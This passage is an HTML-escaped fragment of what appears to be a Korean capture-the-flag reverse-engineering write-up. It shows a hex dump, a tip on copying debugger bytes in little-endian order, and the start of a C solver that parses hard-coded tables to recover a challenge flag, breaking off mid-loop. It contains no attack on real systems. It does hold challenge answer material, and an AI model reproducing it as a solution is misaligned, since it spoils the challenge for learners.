class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;88&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F9&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;디버거에서 뽑은 값은 그대로 복사하면 안된다. 리틀 엔디언이라 순서가 바뀌므로 IDA의 Hex view→범위저장→ HXD로 열어서 복사의 과정을 거치자.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;4-구현-및-결과&quot;&gt;4. 구현 및 결과&lt;/h1&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;        
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev1_sub_1215&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev2_sub_1447&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev3_sub_14ed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev4_sub_15bb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev4_1_sub_1545&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev4_2_sub_1580&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev5_sub_16e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev6_sub_172E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// will be parsed and appended to the table1&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;07 09 0E 01 0C 08 03 06 04 0A 02 0B 00 05 0F 0D 03 01 04 0A 02 06 0B 08 0F 09 0C 05 0E 00 0D 07 0A 0E 0D 04 05 06 08 03 0B 0F 09 01 0C 02 07 00 07 01 09 0A 05 06 0F 03 0D 02 0E 00 04 0C 08 0B&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// will be parsed and appended to the table2&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;E9 10 8A 6D 2D 6C 45 61 0C F6 21 47 15 0E C8 25 9A E5 CA 53 18 07 F4 C3 FB 4C AC 34 31 38 D3 0A D5 22 0B C4 F5 F8 19 ED D0 42 F2 BE F8 4A 0B 37 B4 68 58 92 BB 47 E6 A5 4C 21 4D EC 8E 7A FA 2F&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// will be parsed and appended to the answer&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;27 63 72 73 43 3F 9F 43 2E F0 33 F3 1E 07 0A 33 E5 6C DB 5F C9 11 DE 62 42 18 FE 9B 8E 15 3A BB 96 DB 9E 23 FD 90 10 9B 8E 0A 89 47 BD 8E 88 D6 F9 B9 50 76 E1 0C 4F 89 54 9D B1 F1 A6 9B 8A 2C&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;//parsing &lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp_len1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_len1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_len1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_len1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_len1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;table1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//printf(&quot;table1[%d]: %ldbyte, \\x0%x\n&quot;, i, sizeof(table1[i]), table1[i]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_len1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;table2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//printf(&quot;table1[%d]: %ldbyte, \\x0%x\n&quot;, i, sizeof(table1[i]), table1[i]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_len1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hexByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
